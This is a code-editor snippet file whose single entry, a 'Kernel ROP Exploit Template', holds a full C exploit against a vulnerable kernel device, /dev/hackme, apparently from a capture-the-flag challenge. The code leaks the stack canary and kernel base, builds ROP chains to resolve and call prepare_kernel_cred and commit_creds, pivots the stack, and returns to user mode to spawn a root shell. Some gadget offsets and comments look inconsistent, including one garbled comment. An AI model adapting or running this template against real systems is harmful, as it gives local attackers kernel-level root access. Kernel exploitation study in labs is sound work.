{
  "Kernel Exploit Template": {
    "prefix": "kpwn",
    "body": [
      "#define _GNU_SOURCE",
      "#include <sys/types.h>",
      "#include <unistd.h>",
      "#include <fcntl.h>",
      "#include <sys/mman.h>",
      "#include <stdio.h>",
      "#include <stdlib.h>",
      "#include <stdint.h>",
      "#include <inttypes.h>",
      "#include <sys/syscall.h>  /* For SYS_xxx definitions */",
      "",
      "#define DEV_NAME \"/dev/hackme\"",
      "int g_fd;",
      "",
      "// Forward declarations",
      "void spawn_root_shell(void);",
      "void open_vulnerable_device(void);",
      "void save_user_context(void);",
      "void leak_kernel_info(void);",
      "void exploit_commit_creds_addr(void);",
      "void resolve_commit_creds_addr(void);",
      "void resolve_prepare_kernel_cred_addr(void);",
      "void store_kernel_creds(void);",
      "void exploit_prepare_kernel_cred_addr(void);",
      "void invoke_prepare_kernel_cred(void);",
      "void invoke_commit_creds(void);",
      "void setup_rop_stack(void);",
      "void trigger_stack_overflow(void);",
      "",
      "void spawn_root_shell(void)",
      "{",
      "    puts(\"[*] Spawning root shell.\");",
      "    // use execve to spawn a shell",
      "    char *argv[] = {\"/bin/sh\", NULL};",
      "    char *envp[] = {NULL};",
      "    execve(argv[0], argv, envp);",
      "    perror(\"[-] execve failed.\\n\");",
      "    exit(-1);",
      "}",
      "",
      "void open_vulnerable_device(void)",
      "{",
      "    g_fd = open(DEV_NAME, O_RDWR);",
      "    if (g_fd < 0) {",
      "        perror(\"[-] Open \" DEV_NAME \" failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    puts(\"[*] Open \" DEV_NAME \" success.\");",
      "}",
      "",
      "void spawn_root_shell(void);",
      "uint64_t g_usr_ip = (uint64_t)spawn_root_shell;",
      "uint64_t g_usr_cs, g_usr_ss, g_usr_sp, g_usr_rflags;",
      "void save_user_context(void)",
      "{",
      "    __asm__ volatile(",
      "        \".intel_syntax noprefix;\"",
      "        \"mov g_usr_cs, cs;\"",
      "        \"mov g_usr_ss, ss;\"",
      "        \"mov g_usr_sp, rsp;\"",
      "        \"pushfq;\"",
      "        \"pop g_usr_rflags;\"",
      "        \".att_syntax;\"",
      "    );",
      "    puts(\"[*] Save user context.\");",
      "}",
      "",
      "// gadgets",
      "// ffffffff81000000 <_stext>:",
      "const uint64_t DEF_IMG_BASE = 0xffffffff81000000;",
      "uint64_t g_image_base = 0; // kernel base address",
      "// ffffffffae8ea810 T prepare_kernel_cred",
      "uint64_t g_prepare_kernel_cred = 0;",
      "// ffffffffaebd6010 T commit_creds",
      "uint64_t g_commit_creds = 0;",
      "",
      "// 0xffffffff81006370 : pop rdi ; ret",
      "uint64_t g_pop_rdi = 0x6370; // image_base + 0x6370;",
      "// 0xffffffff8150b97e : pop rsi ; ret",
      "uint64_t g_pop_rsi =  0xffffffff8150b97e;",
      "// 0xffffffff815f4bbc : pop rcx ; ret",
      "uint64_t g_pop_rcx = 0xffffffff815f4bbc;",
      "// 0xffffffff81004d11 : pop rax ; ret",
      "uint64_t g_pop_rax = 0xffffffff81004d11 - DEF_IMG_BASE;",
      "// 0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret ",
      "uint64_t g_read_mem = 0xffffffff81015a7f - DEF_IMG_BASE; // image_base + 0x15a7f;",
      "// 0xffffffff818c6ebb : cmp ecx, esi ; mov rdi, rax ; ja 0xffffffff818c6ead ; pop rbp ; ret",
      "uint64_t g_mov_rdi_rax_pop_rbp = 0xffffffff818c6ebb;",
      "// 0xffffffff8100a55f : swapgs ; pop rbp ; ret",
      "uint64_t g_swapgs_pop_rbp = 0xffffffff8100a55f - DEF_IMG_BASE;",
      "// 0xffffffff8100c0d9 : iretq",
      "uint64_t g_iretq = 0xffffffff8100c0d9 - DEF_IMG_BASE;",
      "// ffffffffae600f10 T swapgs_restore_regs_and_return_to_usermode",
      "uint64_t g_swapgs_restore_regs_and_return_to_usermode = 0xffffffffae600f10 + 22 - 0xffffffffae400000;",
      "",
      "// ffffffffaf385198 R __start___ksymtab",
      "uint64_t g_ksymtab_start = 0xffffffffb9585198 - 0xffffffffb8600000;",
      "// ffffffffaf38d4fc r __ksymtab_prepare_kernel_cred",
      "uint64_t g_ksymtab_prepare_kernel_cred = 0xffffffffb958d4fc - 0xffffffffb8600000;",
      "// ffffffffaf387d90 r __ksymtab_commit_creds  ",
      "uint64_t g_ksymtab_commit_creds = 0xffffffffb9587d90 - 0xffffffffb8600000;",
      "",
      "uint64_t g_canary;",
      "void leak_kernel_info(void)",
      "{",
      "    // Leak canary and kernel base, then update ROP gadget addresses",
      "    uint64_t off = 16;",
      "    // ffffffffae400000 T _stext ",
      "    // 0xffffb3d1401bff38:     0xffffffffae40a157",
      "    uint64_t img_addr_off = 38;",
      "    uint64_t img_base_off = 0xffffffffae40a157-0xffffffffae400000;",
      "    uint64_t buf[40] = {0};",
      "    ssize_t ret = read(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Read failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    g_canary = buf[off];",
      "    g_image_base = buf[img_addr_off] - img_base_off;",
      "    printf(\"[*] Leak canary: 0x%\" PRIx64 \"\\n\", g_canary);",
      "    printf(\"[*] Leak image base: 0x%\" PRIx64 \"\\n\", g_image_base);",
      "",
      "    g_ksymtab_start += g_image_base;",
      "    g_ksymtab_prepare_kernel_cred += g_image_base;",
      "    g_ksymtab_commit_creds += g_image_base;",
      "",
      "    // update gadgets with the image base",
      "    g_pop_rdi += g_image_base;",
      "    g_read_mem += g_image_base;",
      "    g_pop_rax += g_image_base;",
      "    g_iretq += g_image_base;",
      "    g_swapgs_pop_rbp += g_image_base;",
      "    g_swapgs_restore_regs_and_return_to_usermode += g_image_base;",
      "}",
      "",
      "uint64_t g_rax_val;",
      "uint64_t g_returned_creds;",
      "void resolve_commit_creds_addr(void);",
      "void resolve_prepare_kernel_cred_addr(void);",
      "void store_kernel_creds(void);",
      "void exploit_commit_creds_addr(void);",
      "void exploit_prepare_kernel_cred_addr(void);",
      "void invoke_prepare_kernel_cred(void);",
      "void invoke_commit_creds(void);",
      "",
      "void exploit_commit_creds_addr(void)",
      "{",
      "    uint64_t buf[50] = {0};",
      "    uint64_t *p = buf+16;",
      "    uint64_t ret_val = 0;",
      "    *p++ = g_canary; // canary",
      "    *p++ = 0; // dummy rbx",
      "    *p++ = 0; // dummy r12",
      "    *p++ = 0; // dummy rbp",
      "    *p++ = g_pop_rax;",
      "    *p++ = g_ksymtab_commit_creds;",
      "    *p++ = g_read_mem;  // now rax = fn_ksymtab.value_offset",
      "    *p++ = 0; // dummy rbp",
      "    ",
      "    // parepare for return.",
      "    *p++ = g_swapgs_restore_regs_and_return_to_usermode;",
      "    *p++ = 0;",
      "    *p++ = 0;",
      "    *p++ = (uint64_t)resolve_commit_creds_addr; // return to resolve_commit_creds_addr);",
      "    *p++ = g_usr_cs;",
      "    *p++ = g_usr_rflags;",
      "    *p++ = g_usr_sp;",
      "    *p++ = g_usr_ss;",
      "",
      "    ssize_t ret = write(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Write failed.\\n\");",
      "        exit(-1);",
      "    }",
      "}",
      "",
      "void resolve_commit_creds_addr(void)",
      "{",
      "    __asm__ volatile(",
      "        \".intel_syntax noprefix;\"",
      "        \"mov g_rax_val, eax;\"   // ksymtab.value_offset is in eax, an int32_t.",
      "        \".att_syntax;\"",
      "    );",
      "    printf(\"[*] g_rax_val: 0x%\" PRIx64 \"\\n\", g_rax_val);",
      "    g_commit_creds = g_ksymtab_commit_creds + (int)g_rax_val;",
      "    printf(\"[*] g_commit_creds: 0x%\" PRIx64 \"\\n\", g_commit_creds);",
      "    exploit_prepare_kernel_cred_addr();",
      "}",
      "",
      "void exploit_prepare_kernel_cred_addr(void)",
      "{",
      "    uint64_t buf[50] = {0};",
      "    uint64_t *p = buf+16;",
      "    uint64_t ret_val = 0;",
      "    *p++ = g_canary; // canary",
      "    *p++ = 0; // dummy rbx",
      "    *p++ = 0; // dummy r12",
      "    *p++ = 0; // dummy rbp",
      "    *p++ = g_pop_rax;",
      "    *p++ = g_ksymtab_prepare_kernel_cred;",
      "    *p++ = g_read_mem;  // now rax = fn_ksymtab.value_offset",
      "    *p++ = 0; // dummy rbp",
      "    ",
      "    // parepare for return.",
      "    *p++ = g_swapgs_restore_regs_and_return_to_usermode;",
      "    *p++ = 0;",
      "    *p++ = 0;",
      "    *p++ = (uint64_t)resolve_prepare_kernel_cred_addr; // return to resolve_prepare_kernel_cred_addr);",
      "    *p++ = g_usr_cs;",
      "    *p++ = g_usr_rflags;",
      "    *p++ = g_usr_sp;",
      "    *p++ = g_usr_ss;",
      "",
      "    ssize_t ret = write(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Write failed.\\n\");",
      "        exit(-1);",
      "    }",
      "}",
      "",
      "void resolve_prepare_kernel_cred_addr(void)",
      "{",
      "    __asm__ volatile(",
      "        \".intel_syntax noprefix;\"",
      "        \"mov g_rax_val, eax;\"",
      "        \".att_syntax;\"",
      "    );",
      "    g_prepare_kernel_cred = g_ksymtab_prepare_kernel_cred + (int)g_rax_val;",
      "    printf(\"[*] g_prepare_kernel_cred: 0x%\" PRIx64 \"\\n\", g_prepare_kernel_cred);",
      "    invoke_prepare_kernel_cred();",
      "}",
      "",
      "void invoke_prepare_kernel_cred(void)",
      "{",
      "    uint64_t buf[50] = {0};",
      "    uint64_t *p = buf+16;",
      "    *p++ = g_canary; // canary",
      "    *p++ = 0; // dummy rbx",
      "    *p++ = 0; // dummy r12",
      "    *p++ = 0; // dummy rbp",
      "    *p++ = g_pop_rdi;",
      "    *p++ = 0; // rdi for prepare_kernel_cred(0);",
      "    *p++ = g_prepare_kernel_cred; // prepare_kernel_cred(0);",
      "    *p++ = g_swapgs_restore_regs_and_return_to_usermode;",
      "    *p++ = 0;",
      "    *p++ = 0;",
      "    *p++ = (uint64_t)store_kernel_creds; // return to store_kernel_creds",
      "    *p++ = g_usr_cs;",
      "    *p++ = g_usr_rflags;",
      "    *p++ = g_usr_sp;",
      "    *p++ = g_usr_ss;",
      "",
      "    ssize_t ret = write(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Write failed.\\n\");",
      "        exit(-1);",
      "    }",
      "}",
      "",
      "void store_kernel_creds(void)",
      "{",
      "    __asm__ volatile(",
      "        \".intel_syntax noprefix;\"",
      "        \"mov g_rax_val, rax;\"",
      "        \".att_syntax;\"",
      "    );",
      "    g_returned_creds = g_rax_val;",
      "    printf(\"[*] g_returned_creds: 0x%\" PRIx64 \"\\n\", g_returned_creds);",
      "    // Now we have the creds, we can call commit_creds.",
      "    invoke_commit_creds();",
      "}",
      "",
      "void invoke_commit_creds(void)",
      "{",
      "    uint64_t buf[50] = {0};",
      "    uint64_t *p = buf+16;",
      "    *p++ = g_canary; // canary",
      "    *p++ = 0; // dummy rbx",
      "    *p++ = 0; // dummy r12",
      "    *p++ = 0; // dummy rbp",
      "    *p++ = g_pop_rdi;",
      "    *p++ = g_returned_creds; // rdi for commit_creds(cre calves);",
      "    *p++ = g_commit_creds; // commit_creds(creds);",
      "",
      "    // prepare for return.",
      "    *p++ = g_swapgs_restore_regs_and_return_to_usermode;",
      "    *p++ = 0;",
      "    *p++ = 0;",
      "    *p++ = (uint64_t)spawn_root_shell; // return to final_stage",
      "    *p++ = g_usr_cs;",
      "    *p++ = g_usr_rflags;",
      "    *p++ = g_usr_sp;",
      "    *p++ = g_usr_ss;",
      "",
      "    ssize_t ret = write(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Write failed.\\n\");",
      "        exit(-1);",
      "    }",
      "}",
      "",
      "// 0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret ",
      "uint64_t g_pivot_stack = 0xffffffff8196f56a;",
      "uint64_t *g_new_stk_base = (uint64_t*)0x5b000000;",
      "void setup_rop_stack(void)",
      "{",
      "    uint64_t *buf = (uint64_t*)mmap((void*)g_new_stk_base - 0x1000, 0x2000, PROT_EXEC | PROT_READ | PROT_WRITE,",
      "                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);",
      "    printf(\"[*] mmap buf: 0x%lx\\n\", (uint64_t)buf);",
      "    if (buf == MAP_FAILED) {",
      "        perror(\"[-] mmap failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    buf[0] = 0; // make sure the phisical page is allocated.",
      "    uint64_t *p = g_new_stk_base; // reserve the 1st page for internal function call.",
      "    *p++ = 0; // r12 for pivot stack",
      "    *p++ = 0; // rbp for pivot stack",
      "    *p++ = g_pop_rdi;",
      "    *p++ = 0;",
      "    *p++ = g_prepare_kernel_cred; // prepare_kernel_cred(0);",
      "    *p++ = g_pop_rcx;",
      "    *p++ = 0;",
      "    *p++ = g_pop_rsi;",
      "    *p++ = 0;",
      "    *p++ = g_mov_rdi_rax_pop_rbp;",
      "    *p++ = 0; // rbp",
      "    *p++ = g_commit_creds; // commit_creds(rax);",
      "    *p++ = g_swapgs_pop_rbp; // swapgs; pop rbp;",
      "    *p++ = 0; // rbp",
      "    *p++ = g_iretq; // iretq",
      "    *p++ = g_usr_ip;",
      "    *p++ = g_usr_cs;",
      "    *p++ = g_usr_rflags;",
      "    *p++ = g_usr_sp;",
      "    *p++ = g_usr_ss;",
      "}",
      "",
      "void trigger_stack_overflow(void)",
      "{",
      "    uint64_t off = 16;",
      "    uint64_t buf[0x20] = {0};",
      "    uint64_t *p = buf + off;",
      "    *p++ = g_canary; // canary",
      "    *p++ = 0; // dummy rbx",
      "    *p++ = 0; // dummy r12",
      "    *p++ = 0; // dummy rbp",
      "    *p++ = g_pivot_stack; // return to stack pivot",
      "    ssize_t ret = write(g_fd, buf, sizeof(buf));",
      "    if (ret < 0) {",
      "        perror(\"[-] Write failed.\\n\");",
      "        exit(-1);",
      "    }",
      "    puts(\"[*] Should never be here.\");",
      "}",
      "",
      "int main()",
      "{",
      "    printf(\"spawn_root_shell: 0x%\" PRIx64 \"\\n\", (uint64_t)spawn_root_shell);",
      "    save_user_context();",
      "    open_vulnerable_device();",
      "    leak_kernel_info();",
      "    exploit_commit_creds_addr();",
      "    // alloc_new_stack();",
      "    // overflow();",
      "    return 0;",
      "}"
    ],
    "description": "Kernel ROP Exploit Template"
  }
}